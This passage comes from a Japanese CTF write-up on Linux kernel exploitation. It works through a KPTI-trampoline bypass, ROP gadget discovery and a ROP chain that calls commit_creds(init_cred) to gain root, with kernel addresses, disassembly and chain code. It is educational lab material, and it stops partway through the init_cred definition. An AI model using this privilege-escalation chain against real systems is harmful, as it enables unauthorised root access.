    style="padding-bottom: 64.16666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlUlEQVQoz32SX5OCIBTF/f5frpdtesraLNRSQgJSVNwfWM3uy55hGO7l3D/nQqa1Vkrdbrf6Dcz7/Y6nqipM9uv1iuf6QV2ztW2bQZVS3hNkgnOu6zrMpmlIAQknNA6rp0mAkC3LYozB4A7G8/mcpglPCIGmyrKExBkPGSkIE87QR8Tgx+MhLpc8z4uioE/uYrq2PZ1OFDLWzvNsrSXLKaGpqoEyxsRgKpBybZUOCSbd+XymSyRQBBMOV2vnkp7r2ij1Cl5nwx1sgqlzPBwou9vtvrbbQ553Sg1v9EhzLnif0SGJ8/0eeUwZJda5hzGCIafhsMe+tJ7miCmEeRyXYVjGMdtsNtyh5JJQlaVVyko5NI1nMNZ6a9md1oEY1jQt3i99H4NfMqTUCRwQaaFCAiGwgGP+8xzNz07wOm3GcxGCLFGT9+tTLW/EYET+8vwJZjzxG0npvUez/Uv9L5g638djKcS5KPh6/C/Hx9A6yks6GSxO9tWMK51fTyWEuCXwlZ21fPfeGMT7tDjoruOFVtOjLL3ZDyBI4xwbZLpkAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9c8ba7b03953bfeb10787c8f22e589ca/8ac56/Privilege-Escalation-Procedure-through-commit-creds.webp 240w,
/static/9c8ba7b03953bfeb10787c8f22e589ca/d3be9/Privilege-Escalation-Procedure-through-commit-creds.webp 480w,
/static/9c8ba7b03953bfeb10787c8f22e589ca/10237/Privilege-Escalation-Procedure-through-commit-creds.webp 850w"
              sizes="(max-width: 850px) 100vw, 850px"
              type="image/webp"
            />
          <source
            srcset="/static/9c8ba7b03953bfeb10787c8f22e589ca/ce5a9/Privilege-Escalation-Procedure-through-commit-creds.ppm 240w,
/static/9c8ba7b03953bfeb10787c8f22e589ca/a4dee/Privilege-Escalation-Procedure-through-commit-creds.ppm 480w,
/static/9c8ba7b03953bfeb10787c8f22e589ca/645e0/Privilege-Escalation-Procedure-through-commit-creds.ppm 850w"
            sizes="(max-width: 850px) 100vw, 850px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9c8ba7b03953bfeb10787c8f22e589ca/645e0/Privilege-Escalation-Procedure-through-commit-creds.ppm"
            alt="img"
            title="img"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>問題環境の prepare<em>kernel</em>cred と commit_creds のアドレスは以下のコマンドで特定しました。</p>
<p>※ ちなみに release の方のイメージだと [/proc/sys/kernel/kptr_restrict] が 0 ではなく 2 に指定されているので /proc/kallsyms からアドレスを参照できません。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> prepare_kernel_cred
<span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> commit_creds</code></pre></div>
<p>これで勝つると、奪取した RIP で escalate_privilege 関数に ret させたものの、以下のように <code class="language-text">permissions violation</code> で関数プロローグの最初の行でクラッシュしてしまいました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/f74509e456ea05bd299d76d464f304b8/d326d/image-20230607210530848.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 66.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC1klEQVQ4yz2TW1PaUBSFeWoVUeQmqFQFuZPkJCEh4X5HgtxFKog6LdZ2pu3/f1zd59jxYU9OZjIre631HddtrgU+zQsTg3Qd3XgJjaiB9pUFOyijGtFgBnJQglmoEQXWpQkWVcECeTB/BoovB5nOujeN0kESrq/2GA/lKTaVGR5rC6ysEe6LI9wZDs0Qg2QNNgnpPhlDxUEhqEM5lMHcGbD91PuTRnGnILvTcHGBpTnEmkTvi7eYazcYyx2UTxjKYYb2hSUEy+cqfg62aHwxYJwzWCEJbC8OZS8G5XNMnNX963dBvuFDaYK7goMJifEIpkoXDkVQIWHDnxWirzcbdGM2WmR7pvbQi5dROEqLaMzjLG38X5Bvt+tv8NJeYUURfO+t8Xu2o237YuOR2oEeZOhnejACOhhZLpL16pkJ+9RC6dRGMaCQbbI8U/vY1hf4NX7BU3MpBN+GT/i7eMW2cSd+NDcHcKQWtHALcW8fCf8Qmr+Icb5JRTbIdlyM6k7ANSFrvAxeDhefsp7IlIvxGCZyF5WojqXtUMNDxPxTXAdnsM5q6CQ7UDwSahEmyNB4y4vCAP1EBbonhSIhYHizImSZRvp0Rec4JHccjtyCEWkiedxB4riHQsjGTaoOw0flkFXmTon5sPyt+0Cb3ZJ4FXZAEgFzC0Jw/wrGaQlmqAr50AILFmGEiUnKVT1IfYgJQW7vsToX+a0rU8EeZ3BNXI7ybdGydSLB9DPYviIUrwHVpxGXErSjLP1AIi4J8gPa0kOlcIh5VjtC4oly4yy+DZ9FKVx4y/OtjJEOZKCfkdC5hvyJDInfEMJJ8iuQeMN0lulGufgWvIAfBO1jbS7Euf0/851o+LmxxCBXp63yaF830Mu00YrXib+cYND05+hq5mEQhwXa2MU32pBl3jLnkbfOm+bvTqaBziXnjKEa1bAgJlf0/TjfghmWYIR4iWnoh0kxmieJfxd4pRCX9BGrAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/f74509e456ea05bd299d76d464f304b8/8ac56/image-20230607210530848.webp 240w,
/static/f74509e456ea05bd299d76d464f304b8/d3be9/image-20230607210530848.webp 480w,
/static/f74509e456ea05bd299d76d464f304b8/e46b2/image-20230607210530848.webp 960w,
/static/f74509e456ea05bd299d76d464f304b8/760a1/image-20230607210530848.webp 1197w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/f74509e456ea05bd299d76d464f304b8/8ff5a/image-20230607210530848.png 240w,
/static/f74509e456ea05bd299d76d464f304b8/e85cb/image-20230607210530848.png 480w,
/static/f74509e456ea05bd299d76d464f304b8/d9199/image-20230607210530848.png 960w,
/static/f74509e456ea05bd299d76d464f304b8/d326d/image-20230607210530848.png 1197w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/f74509e456ea05bd299d76d464f304b8/d9199/image-20230607210530848.png"
            alt="image-20230607210530848"
            title="image-20230607210530848"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ここでクラッシュする原因がわからずしばらく苦戦しましたが、 CR3 レジスタが参照しているディレクトリテーブルのアドレスがカーネル空間のままになっていることが原因でユーザ空間のコード実行に失敗していたようでした。</p>
<p>これは、カーネルのセキュリティ機構である KPTI によるもので、ユーザ空間のページテーブルを参照しないままユーザ空間のコード実行を試みたためにクラッシュが発生したようです。</p>
<h3 id="kpti-の回避" style="position:relative;"><a href="#kpti-%E3%81%AE%E5%9B%9E%E9%81%BF" aria-label="kpti の回避 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>KPTI の回避</h3>
<p>KPTI を回避するためには、一般的に以下の 2 つの手法があるようです。(他にもあるようですが、詳しい挙動は理解できませんでした。)</p>
<ol>
<li>KPTI トランポリン</li>
<li>プロセスに返された SIGSEGV の例外を処理するイベントハンドラの実装</li>
</ol>
<p>参考：<a href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti" target="_blank" rel="nofollow noopener noreferrer">Kernel page table isolation (KPTI) - Breaking Bits</a></p>
<p>ただし、どうもどちらの回避策も、利用するためにはカーネル空間で ROP Chains を組む必要があるようです。</p>
<p>今回は、KPTI トランポリンによる回避を試してみました。</p>
<p>具体的には、カーネル内に存在している swapgs<em>restore</em>regs<em>and</em>return<em>to</em>usermode マクロを使用して CR3 レジスタの値を適切に切り替えます。</p>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html#ret2user-ret2usr" target="_blank" rel="nofollow noopener noreferrer">Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</a></p>
<p>参考：<a href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti" target="_blank" rel="nofollow noopener noreferrer">Kernel page table isolation (KPTI) - Breaking Bits</a></p>
<p>KPTI トランポリンを実現できる ROP ガジェットを特定するため、まずは swapgs<em>restore</em>regs<em>and</em>return<em>to</em>usermode のアドレスを特定します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> swapgs_restore_regs_and_return_to_usermode
ffffffff818017e0 T swapgs_restore_regs_and_return_to_usermode</code></pre></div>
<p>このアドレスのアセンブリを適当に取得してみると、以下のようになっていました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">$ x<span class="token operator">/</span><span class="token number">100</span>i <span class="token number">0xffffffff818017e0</span>
   <span class="token number">0xffffffff818017e0</span><span class="token operator">:</span>  jmp    <span class="token number">0xffffffff818017fb</span>
   <span class="token number">0xffffffff818017e2</span><span class="token operator">:</span>  mov    ecx<span class="token punctuation">,</span><span class="token number">0x48</span>
   <span class="token number">0xffffffff818017e7</span><span class="token operator">:</span>  mov    rdx<span class="token punctuation">,</span>QWORD PTR gs<span class="token operator">:</span><span class="token number">0x1bcf0</span>
   <span class="token number">0xffffffff818017f0</span><span class="token operator">:</span>  and    edx<span class="token punctuation">,</span><span class="token number">0xfffffffe</span>
   <span class="token number">0xffffffff818017f3</span><span class="token operator">:</span>  mov    eax<span class="token punctuation">,</span>edx
   <span class="token number">0xffffffff818017f5</span><span class="token operator">:</span>  shr    rdx<span class="token punctuation">,</span><span class="token number">0x20</span>
   <span class="token number">0xffffffff818017f9</span><span class="token operator">:</span>  wrmsr
   <span class="token number">0xffffffff818017fb</span><span class="token operator">:</span>  pop    r15
   <span class="token number">0xffffffff818017fd</span><span class="token operator">:</span>  pop    r14
   <span class="token number">0xffffffff818017ff</span><span class="token operator">:</span>  pop    r13
   <span class="token number">0xffffffff81801801</span><span class="token operator">:</span>  pop    r12
   <span class="token number">0xffffffff81801803</span><span class="token operator">:</span>  pop    rbp
   <span class="token number">0xffffffff81801804</span><span class="token operator">:</span>  pop    rbx
   <span class="token number">0xffffffff81801805</span><span class="token operator">:</span>  pop    r11
   <span class="token number">0xffffffff81801807</span><span class="token operator">:</span>  pop    r10
   <span class="token number">0xffffffff81801809</span><span class="token operator">:</span>  pop    r9
   <span class="token number">0xffffffff8180180b</span><span class="token operator">:</span>  pop    r8
   <span class="token number">0xffffffff8180180d</span><span class="token operator">:</span>  pop    rax
   <span class="token number">0xffffffff8180180e</span><span class="token operator">:</span>  pop    rcx
   <span class="token number">0xffffffff8180180f</span><span class="token operator">:</span>  pop    rdx
   <span class="token number">0xffffffff81801810</span><span class="token operator">:</span>  pop    rsi
   <span class="token number">0xffffffff81801811</span><span class="token operator">:</span>  mov    rdi<span class="token punctuation">,</span>rsp
   <span class="token number">0xffffffff81801814</span><span class="token operator">:</span>  mov    rsp<span class="token punctuation">,</span>QWORD PTR gs<span class="token operator">:</span><span class="token number">0x6004</span>
   <span class="token number">0xffffffff8180181d</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">]</span>
   <span class="token number">0xffffffff81801820</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">]</span>
   <span class="token number">0xffffffff81801823</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">]</span>
   <span class="token number">0xffffffff81801826</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">]</span>
   <span class="token number">0xffffffff81801829</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span>
   <span class="token number">0xffffffff8180182c</span><span class="token operator">:</span>  push   QWORD PTR <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span>
   <span class="token number">0xffffffff8180182e</span><span class="token operator">:</span>  push   rax
   <span class="token number">0xffffffff8180182f</span><span class="token operator">:</span>  xchg   ax<span class="token punctuation">,</span>ax
   <span class="token number">0xffffffff81801831</span><span class="token operator">:</span>  mov    rdi<span class="token punctuation">,</span>cr3
   <span class="token number">0xffffffff81801834</span><span class="token operator">:</span>  jmp    <span class="token number">0xffffffff8180186a</span>
   <span class="token number">0xffffffff81801836</span><span class="token operator">:</span>  mov    rax<span class="token punctuation">,</span>rdi
   <span class="token number">0xffffffff81801839</span><span class="token operator">:</span>  and    rdi<span class="token punctuation">,</span><span class="token number">0x7ff</span>
   <span class="token number">0xffffffff81801840</span><span class="token operator">:</span>  bt     QWORD PTR gs<span class="token operator">:</span><span class="token number">0x20ad6</span><span class="token punctuation">,</span>rdi
   <span class="token number">0xffffffff8180184a</span><span class="token operator">:</span>  jae    <span class="token number">0xffffffff8180185b</span>
   <span class="token number">0xffffffff8180184c</span><span class="token operator">:</span>  btr    QWORD PTR gs<span class="token operator">:</span><span class="token number">0x20ad6</span><span class="token punctuation">,</span>rdi
   <span class="token number">0xffffffff81801856</span><span class="token operator">:</span>  mov    rdi<span class="token punctuation">,</span>rax
   <span class="token number">0xffffffff81801859</span><span class="token operator">:</span>  jmp    <span class="token number">0xffffffff81801863</span>
   <span class="token number">0xffffffff8180185b</span><span class="token operator">:</span>  mov    rdi<span class="token punctuation">,</span>rax
   <span class="token number">0xffffffff8180185e</span><span class="token operator">:</span>  bts    rdi<span class="token punctuation">,</span><span class="token number">0x3f</span>
   <span class="token number">0xffffffff81801863</span><span class="token operator">:</span>  or     rdi<span class="token punctuation">,</span><span class="token number">0x800</span>
   <span class="token number">0xffffffff8180186a</span><span class="token operator">:</span>  or     rdi<span class="token punctuation">,</span><span class="token number">0x1000</span>
   <span class="token number">0xffffffff81801871</span><span class="token operator">:</span>  mov    cr3<span class="token punctuation">,</span>rdi
   <span class="token number">0xffffffff81801874</span><span class="token operator">:</span>  pop    rax
   <span class="token number">0xffffffff81801875</span><span class="token operator">:</span>  pop    rdi
   <span class="token number">0xffffffff81801876</span><span class="token operator">:</span>  swapgs
   <span class="token number">0xffffffff81801879</span><span class="token operator">:</span>  jmp    <span class="token number">0xffffffff81801896</span></code></pre></div>
<p>ここで、最終的に CR3 レジスタを書き換えてユーザ空間に処理を戻すことができるのは <code class="language-text">mov    rdi,cr3</code> の行から <code class="language-text">swapgs</code> のあたりまでの処理です。</p>
<p>この一連の処理を正しく呼び出すためには事前に取得しておいた user_rsp などの値をスタックに積んだ上で <code class="language-text">0xffffffff81801811</code> に処理を飛ばしてあげる必要があることがわかります。</p>
<p>というわけで、KPIT トランポリンを行うための ROP ガジェットのアドレスを以下のように設定しました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> rop_bypass_kpti <span class="token operator">=</span> <span class="token number">0xffffffff81801811</span><span class="token punctuation">;</span></code></pre></div>
<h3 id="rop-chains-の作成" style="position:relative;"><a href="#rop-chains-%E3%81%AE%E4%BD%9C%E6%88%90" aria-label="rop chains の作成 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP Chains の作成</h3>
<p>rop<em>bypass</em>kpti のアドレスは特定できたので、このままカーネル空間で prepare<em>kernel</em>cred と commit_creds を呼び出して権限昇格をする ROP Chains を作成しようと思います。</p>
<p>カーネル空間で ROP ガジェットを探索するため、展開した vmlinux に対して ROPgadget をかけます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ROP chain の探索</span>
ROPgadget --binary vmlinux <span class="token operator">></span> ropchain</code></pre></div>
<p><a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html" target="_blank" rel="nofollow noopener noreferrer">Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</a> を参考にして次のようなガジェットを探します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">pop rdi<span class="token punctuation">;</span> ret<span class="token punctuation">;</span>
pop rcx<span class="token punctuation">;</span> ret<span class="token punctuation">;</span>
mov rdi, rax<span class="token punctuation">;</span> rep movsq <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span>, <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span><span class="token punctuation">;</span> ret<span class="token punctuation">;</span>
swapgs<span class="token punctuation">;</span> ret<span class="token punctuation">;</span>
iretq</code></pre></div>
<p>しかし、<code class="language-text">pop rdi; ret;</code> と <code class="language-text">pop rcx; ret;</code> 以外のガジェットが全く見つかりませんでした。</p>
<p>途方に暮れていたところで、参照していた記事をよく読んでみると以下の記載が見つかりました。</p>
<blockquote>
<p>通常「mov rdi, rax; rep movsq; ret;」のようなgadgetが存在し、prepare<em>kernel</em>cred(NULL)の結果をcommit<em>credsに渡せます。あるいは「mov rdi, rax; call rcx;」のようなgadgetでcommit</em>credsの先頭のpush rbpをスキップして実行しても良いでしょう。
どうしてもgadgetが見つからない時や、ROP chainを短くしたいときはinit<em>credが使えます。init</em>credというグローバル変数にはroot権限のcred構造体が入っています。つまり、単にcommit<em>creds(init</em>cred)を実行するだけでも権限昇格できます。</p>
</blockquote>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html" target="_blank" rel="nofollow noopener noreferrer">Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</a></p>
<p>どうやら root 権限の cred 構造体が定義されているグローバル変数 init<em>cred のアドレスを見つけ出せば、prepare</em>kernel<em>cred を呼び出さなくても <code class="language-text">pop rdi; ret;</code> のガジェットだけで commit</em>creds を呼び出せるようです。</p>
<p>参考：<a href="https://www.iaik.tugraz.at/wp-content/uploads/2021/08/Linux_Kernel_Exploitation.pdf" target="_blank" rel="nofollow noopener noreferrer">Exploiting the Linux Kernel for Privilege Escalation</a></p>
<p>また、そもそもバージョン 6.2 以降の Linux カーネルでは prepare<em>kernel</em>cred 関数に NULL を与えた場合に init<em>cred  が返却される仕様自体が取り払われているため、init</em>cred のアドレスを特定して commit_creds  を呼び出す操作が必須になっているようでした。</p>
<p>実際に <a href="https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c" target="_blank" rel="nofollow noopener noreferrer">cred.c</a> のソースコードを bootlin で比較してみると、確かに以下のように <code class="language-text">old = get_cred(&amp;init_cred);</code> の箇所が削除されています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// v6.1.33 の prepare_kernel_cred</span>
<span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>

	new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">kdebug</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred() alloc %p"</span><span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>daemon<span class="token punctuation">)</span>
		old <span class="token operator">=</span> <span class="token function">get_task_cred</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		old <span class="token operator">=</span> <span class="token function">get_cred</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">{</span><span class="token punctuation">{</span> 省略 <span class="token punctuation">}</span><span class="token punctuation">}</span>
    
<span class="token comment">// v6.2 の prepare_kernel_cred</span>
<span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span><span class="token operator">!</span>daemon<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">kdebug</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred() alloc %p"</span><span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>

	old <span class="token operator">=</span> <span class="token function">get_task_cred</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">validate_creds</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token operator">*</span>new <span class="token operator">=</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>
    <span class="token punctuation">{</span><span class="token punctuation">{</span> 省略 <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></div>
<p>というわけで、最終的に Flag を取得するための ROPChains を以下のように構成することを目標にしました。</p>
<p>commit<em>creds のアドレスは debug 環境で `cat /proc/kallsyms | grep commit</em>creds<code class="language-text">を実行したことで特定されていますし、</code>rop<em>pop</em>rdi<code class="language-text">、</code>rop<em>bypass</em>kpti` のガジェットについてもすでにアドレスは特定済みです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>chain <span class="token operator">=</span> buf<span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> rop_pop_rdi<span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> init_cred<span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> commit_creds<span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> rop_bypass_kpti<span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span> <span class="token comment">// [rdi]</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>win<span class="token punctuation">;</span> <span class="token comment">// [rdi+0x10]</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>             <span class="token comment">// [rdi+0x18]</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>         <span class="token comment">// [rdi+0x20]</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_rsp<span class="token punctuation">;</span>            <span class="token comment">// [rdi+0x28]</span>
<span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>             <span class="token comment">// [rdi+0x30]</span></code></pre></div>
<p>つまり、あとはシステム内の init_cred のアドレスさえ特定できれば権限昇格のための ROPChains に必要な情報がそろいそうです。</p>
<h3 id="init_cred-のアドレスを特定する" style="position:relative;"><a href="#init_cred-%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B" aria-label="init_cred のアドレスを特定する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>init_cred のアドレスを特定する</h3>
<p>ここからは非常に長い道のりで、正直かなりしんどかったです。</p>
<p>Linux カーネルに関する知識が少ないのはもちろんですが、カーネルメモリ内から init_cred を特定する方法に関する情報が非常に少なかったため、かなり苦戦しました。</p>
<p>init<em>cred は以下の cred 構造体のオブジェクトであり、init</em>task.c で定義されたカーネルの初期化処理の中で作成されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> init_cred <span class="token operator">=</span> <span class="token punctuation">{</span>
	<span class="token punctuation">.</span>usage			<span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>
	<span class="token punctuation">.</span>subscribers		<span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token punctuation">.</span>magic			<span class="token operator">=</span> CRED_MAGIC<span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token punctuation">.</span>uid			<span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>gid			<span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>suid			<span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>sgid			<span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>
